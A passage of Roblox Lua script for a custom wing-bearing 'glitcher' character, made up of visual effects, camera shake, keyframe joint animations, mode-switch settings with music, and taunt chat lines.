DerpzDmgInstant(Regionlol)
soundeffect(SoundTable["ModeChange Explosions"][math.random(1,#SoundTable["ModeChange Explosions"])],math.random(7,10)/10,tors,1,0,"boom")
for i = 0,Amount/2 do
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = .75,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = a.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = a.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.new(0, 0, .5),
EndColor = Color3.new(0, 0, 1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(1*SizeVal,1,1*SizeVal),
EndSize = Vector3.new(5*SizeVal,5*SizeVal,5*SizeVal),
Material = "Neon",
Reflectance = 0,
}
)
end
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = .75,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = a.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = a.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(0, 0, .5),
EndColor = Color3.new(0, 0, 1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(1*SizeVal,1,1*SizeVal),
EndSize = Vector3.new(5*SizeVal,15*SizeVal,5*SizeVal),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 3,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = a.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
EndCFrame = a.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(1,1,1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(3*SizeVal,0.1,3*SizeVal),
EndSize = Vector3.new(10*SizeVal,.75*SizeVal,10*SizeVal),
Material = "Neon",
Reflectance = 0,
}
)
wait()
CamShakeAll2({
Duration=.5; -- Lasts for .1 seconds
Intensity=3, -- Intensity of 5
Position=Vector3.new(2,2,2); -- What axises the shake effects and how much (position)
Rotation=Vector3.new(2,2,6); -- What axises the shake effects and how much (rotation)
DropDist=5*SizeVal; -- Camera dist from origin when the shake starts to gradually get weaker
IneffectiveDist=10*SizeVal; -- Camera dist from origin when the shake goes away
Origin=a.Position; -- Where the shake is coming from (Part, CFrame, or Vector3)
})
a.Transparency = 1
game.Debris:AddItem(a,2.5)
delay(.4,function()
aparticle.Drag = 10
aparticle.Enabled = false
end)

end)

end

for i = 0,2,0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0.1,-1.1,-0.5)*angles(math.rad(-40.1),math.rad(-22.7),math.rad(-28))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.1,-0.7,-0.2)*angles(math.rad(2.7),math.rad(32.1),math.rad(-13))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.1,-1.4,-0.5)*angles(math.rad(-50.7),math.rad(-12.6),math.rad(47.5))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.3,-1.4)*angles(math.rad(36.9),math.rad(24.7),math.rad(6.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0.6,0.1)*angles(math.rad(29.4),math.rad(22.1),math.rad(33.7)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(50.2),math.rad(30.5),math.rad(11.9)),Alpha)
end
for i = 0,7,0.1 do
swait()
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0.1,-1.1,-0.5)*angles(math.rad(-41.5),math.rad(-25.2),math.rad(-28.6))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.3,-0.4,0)*angles(math.rad(16.1),math.rad(30.7),math.rad(-8.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.9,-1.3,-0.7)*angles(math.rad(-50.7),math.rad(-12.6),math.rad(47.5))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.7,0.2,-1.4)*angles(math.rad(36.9),math.rad(24.7),math.rad(2.6)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0,-0.8)*angles(math.rad(26.2),math.rad(34.5),math.rad(11.8)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(-20.5),math.rad(9.7),math.rad(32.5)),Alpha)
end
for i = 0,.5,0.1 do
swait()
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,-1,-0.2)*angles(math.rad(24.7),math.rad(-36.6),math.rad(8.5))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-0.4,-0.1)*angles(math.rad(-3.4),math.rad(33.7),math.rad(-11.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.9,-0.7,-0.7)*angles(math.rad(-60.8),math.rad(-12.5),math.rad(6.9))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.3,0.3,-0.3)*angles(math.rad(132.2),math.rad(0.4),math.rad(-24.8)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.7,-0.3)*angles(math.rad(33.4),math.rad(50.4),math.rad(0.7)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(16.2),math.rad(4.3),math.rad(39.2)),Alpha)
end
for i = 0,1,0.1 do
swait()
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,-0.6,0.5)*angles(math.rad(60.2),math.rad(-36.6),math.rad(8.5))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.5,-0.7,-0.4)*angles(math.rad(-39.1),math.rad(34.2),math.rad(9.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.2,-0.7,-0.6)*angles(math.rad(-56.1),math.rad(-12.4),math.rad(38.1))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.5,0)*angles(math.rad(112.8),math.rad(-15.8),math.rad(-15)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.7,-0.3)*angles(math.rad(-24.9),math.rad(31.8),math.rad(41.4)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(33.2),math.rad(8.3),math.rad(26.1)),Alpha)
end

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .75
Animate(RootJoint,cf(0,-0.7,1.6)*angles(math.rad(-6.2),math.rad(-36.6),math.rad(8.5))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.4,0,-0.6)*angles(math.rad(12.7),math.rad(29.8),math.rad(-19.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.6,-0.8)*angles(math.rad(0),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.8,0.4)*angles(math.rad(-5.5),math.rad(2.6),math.rad(-27.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.1,0.2,-0.4)*angles(math.rad(44.5),math.rad(31.9),math.rad(-21.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(9.7),math.rad(-0.8),math.rad(33.8)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .25
Animate(RootJoint,cf(0,-0.7,1.2)*angles(math.rad(-21.2),math.rad(-36.7),math.rad(-4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.4,0,-0.6)*angles(math.rad(27.2),math.rad(24.3),math.rad(-19.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.3,-0.8)*angles(math.rad(0),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,1,0.1)*angles(math.rad(30.9),math.rad(-12.5),math.rad(1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.1,-0.3,-0.8)*angles(math.rad(71.8),math.rad(7.8),math.rad(-63.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(17.2),math.rad(7.2),math.rad(27.3)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .27
Animate(RootJoint,cf(0,-0.2,0.4)*angles(math.rad(-22.8),math.rad(-37.4),math.rad(-1.5))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.3,-0.5,-0.4)*angles(math.rad(31.4),math.rad(20.8),math.rad(-26.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.2,-0.8)*angles(math.rad(-23.5),math.rad(20.2),math.rad(9.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.6,-0.2)*angles(math.rad(20.7),math.rad(-30.3),math.rad(-0.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,0,-0.4)*angles(math.rad(47.9),math.rad(14.5),math.rad(-42.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(16),math.rad(-2.6),math.rad(40.2)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


attack = false
end



function HostileIntroEnd()
attack = true
soundeffect(SoundTable["ModeChange Explosions"][math.random(1,#SoundTable["ModeChange Explosions"])],math.random(7,10)/10,tors,1,0,"boom")
CamShakeAll2({
Duration=1; -- Lasts for .1 seconds
Intensity=3, -- Intensity of 5
Position=Vector3.new(2,2,2); -- What axises the shake effects and how much (position)
Rotation=Vector3.new(2,2,6); -- What axises the shake effects and how much (rotation)
DropDist=1; -- Camera dist from origin when the shake starts to gradually get weaker
IneffectiveDist=100; -- Camera dist from origin when the shake goes away
Origin=char["Torso"].Position; -- Where the shake is coming from (Part, CFrame, or Vector3)
})
for i = 0,4 do
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = RootPart.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.new(1, 1, 0),
EndColor = Color3.new(1, 0.35, 0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(1,1,1),
EndSize = Vector3.new(50,50,50),
Material = "Neon",
Reflectance = 0,
}
)
end
for i = 0,6 do
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "InOut",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
Color = Color3.new(0,0,0),
EndColor = Color3.new(0,0,1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(150,10,150),
Material = "Neon",
Reflectance = 0,
}
)
end
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .25
Animate(RootJoint,cf(0,2,0)*angles(math.rad(43.3),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.9,-0.3)*angles(math.rad(-46.5),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.7)*angles(math.rad(-43.5),math.rad(-2.3),math.rad(1.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.5,0.5)*angles(math.rad(96.8),math.rad(-9),math.rad(-88.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,0.5)*angles(math.rad(105.3),math.rad(6.7),math.rad(88.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-10.1),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
--wait(.5)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .5
Animate(RootJoint,cf(0,2,0)*angles(math.rad(43.3),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.9,-0.3)*angles(math.rad(-46.5),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.7)*angles(math.rad(-43.5),math.rad(-2.3),math.rad(1.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.5,0.5)*angles(math.rad(96.8),math.rad(-9),math.rad(-88.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,0.5)*angles(math.rad(105.3),math.rad(6.7),math.rad(88.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-10.1),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.InOut
local animatetime = .4
Animate(RootJoint,cf(0,-0.9,0)*angles(math.rad(-20),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1.2,-0.5)*angles(math.rad(-54.5),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,0.1,-0.7)*angles(math.rad(19.7),math.rad(0.2),math.rad(2.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.1,0)*angles(math.rad(25.1),math.rad(9.4),math.rad(-14.7)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0,-0.1)*angles(math.rad(24.5),math.rad(-4.3),math.rad(17.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(14.1),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
attack = false
end

function TauntFunction(mode)
if mode == "Exasperation" then
chatfunc("Your demise... Is close.",20,BrickColor.new("Really red").Color,true)
elseif mode == "Serene" then
Hello()
elseif mode == "Hostility" then
chatfunc("You're dead where you stand.",20,BrickColor.new("Really red").Color,true)
elseif mode == "Despondency" then
chatfunc("...",10,BrickColor.new("Really black").Color,true)
elseif mode == "Unrestrained" then
chatfunc("Calm down & rest... It's fine.",15,BrickColor.new("Really blue").Color,true)
elseif mode == "Exstatic" then
chatfunc("Let's party!",25,BrickColor.new("Really blue").Color,true)
elseif mode == "Inexplicable" then
chatfunc("You can't explain what I am or what I do, But you know who I am.",17,Color3.new(.5,.5,.5),true)
elseif mode == "Determined" then
chatfunc("Did you expect a different and more recognisable name?.. Oh who am I kidding.",25,BrickColor.new("Really red").Color,true)
elseif mode == "Resolute" then
chatfunc("It's kinda expected for this mode to be here, I mean, It's a glitcher. What do you expect?",19,Color3.fromRGB(150,0,0),true)
else
--Nothing
end
end

function IntroWing()
coroutine.resume(coroutine.create(function()
txt.Enabled = false
wing1.Core.IntroEff.Enabled = true
wing2.Core.IntroEff.Enabled = true
wing3.Core.IntroEff.Enabled = true
wing4.Core.IntroEff.Enabled = true
wing5.Core.IntroEff.Enabled = true
wing6.Core.IntroEff.Enabled = true
wing1.Core.IntroEff2.Enabled = true
wing2.Core.IntroEff2.Enabled = true
wing3.Core.IntroEff2.Enabled = true
wing4.Core.IntroEff2.Enabled = true
wing5.Core.IntroEff2.Enabled = true
wing6.Core.IntroEff2.Enabled = true
wait(2)
soundeffect(847061203,0.7,tors,7,0,"die")
ModeSwitchLoop({

Name = "",
desc = "",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(0,0,0.5),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0.2,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)),
txtg3 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
musicid = 511836626,
musicname = "TRANSFORMATION COMPLETE",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
txt.Enabled = true
wing1.Core.IntroEff.Enabled = false
wing2.Core.IntroEff.Enabled = false
wing3.Core.IntroEff.Enabled = false
wing4.Core.IntroEff.Enabled = false
wing5.Core.IntroEff.Enabled = false
wing6.Core.IntroEff.Enabled = false
wing1.Core.IntroEff2.Enabled = false
wing2.Core.IntroEff2.Enabled = false
wing3.Core.IntroEff2.Enabled = false
wing4.Core.IntroEff2.Enabled = false
wing5.Core.IntroEff2.Enabled = false
wing6.Core.IntroEff2.Enabled = false
end))
end

function Intro()
attack = true
RootPart.Anchored = true
particles.Enabled = false
txt.Enabled = false
wing1.Core.IntroEff.Enabled = false
wing2.Core.IntroEff.Enabled = false
wing3.Core.IntroEff.Enabled = false
wing4.Core.IntroEff.Enabled = false
wing5.Core.IntroEff.Enabled = false
wing6.Core.IntroEff.Enabled = false
wing1.Core.IntroEff2.Enabled = false
wing2.Core.IntroEff2.Enabled = false
wing3.Core.IntroEff2.Enabled = false
wing4.Core.IntroEff2.Enabled = false
wing5.Core.IntroEff2.Enabled = false
wing6.Core.IntroEff2.Enabled = false
--Exp Sub-Major stuff
if ModeOfCharacter == "Despondency" then
HeartTrans(0)
Tears(true)
else
HeartTrans(1)
Tears(false)
end
hum.WalkSpeed = 0
hum.JumpPower = 0
ModeSwitchLoop({

Name = "",
desc = "",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(0,0,0.5),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 1,
wtr2 = 1,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)),
txtg3 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
musicid = 0,
musicname = "CORE WIELDER HAS EXECUTED COMMAND: CHANGECORETYPE('GLITCHER')",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 0,
jp = 0,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .001
Animate(RootJoint,cf(0,9999,0)*angles(math.rad(0),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,1,0)*angles(math.rad(0),math.rad(0),math.rad(-90.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,1,0)*angles(math.rad(0),math.rad(0),math.rad(90.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-0),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
wait(3)

--START

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,5,0)*angles(math.rad(-81.8),math.rad(-39.6),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(-38.8),math.rad(22.2),math.rad(-3.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(-70.9),math.rad(15.6),math.rad(44.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-2,0.5,-0.3)*angles(math.rad(80.6),math.rad(0),math.rad(-43.9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.9,0.9,0.2)*angles(math.rad(86.2),math.rad(0),math.rad(-41.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(17.5),math.rad(0),math.rad(36.2)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--BANG
soundeffect(SoundTable["Big Explosions"][math.random(1,#SoundTable["Big Explosions"])],1,tors,10,0,"bang")
delay(.2,function()
explode_residue(20,tors,Color3.new(0,0,0),hum.FloorMaterial,0,10,20,3,5)
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 2,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(0,0,1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(50,1,50),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 2,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(1, 0, 0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(100,10,100),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "In",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,20,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(1, 0, 0),
EndColor = Color3.new(0, 0, 0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(40,40,40),
EndSize = Vector3.new(50,500,50),
Material = "Neon",
Reflectance = 0,
}
)


end)
ModeSwitchLoop({

Name = "",
desc = "",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(0,0,0.5),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(0,0,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 1,
wtr2 = 1,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)),
txtg3 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
musicid = 511836626,
musicname = "GLITCHER TYPE STARTED",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 0,
jp = 0,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .25
Animate(RootJoint,cf(0,-0.8,0)*angles(math.rad(-70.1),math.rad(24.6),math.rad(-5.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.8,-1.2)*angles(math.rad(21.2),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.8,0.8,-0.2)*angles(math.rad(52.2),math.rad(-11.1),math.rad(31.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.5,0.3)*angles(math.rad(-45.7),math.rad(4),math.rad(-20.7)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.7,1.2,-0.6)*angles(math.rad(64.7),math.rad(22.4),math.rad(32.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(12.2),math.rad(-4.8),math.rad(-22.8)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 4
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .5
Animate(RootJoint,cf(0,-0.7,0)*angles(math.rad(-70.1),math.rad(24.6),math.rad(-5.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.8,-1.3)*angles(math.rad(21.2),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,0.7,-0.4)*angles(math.rad(52.2),math.rad(-11.1),math.rad(31.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,0.5,0.3)*angles(math.rad(-35.5),math.rad(1.7),math.rad(-16.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.7,1.2,-0.6)*angles(math.rad(64.7),math.rad(22.4),math.rad(32.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(5),math.rad(-1.7),math.rad(-22.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
wait(.5)
--KEYFRAME 5

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .5
Animate(RootJoint,cf(0,-0.8,0)*angles(math.rad(-70.1),math.rad(24.6),math.rad(-5.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.8,-1.2)*angles(math.rad(21.2),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
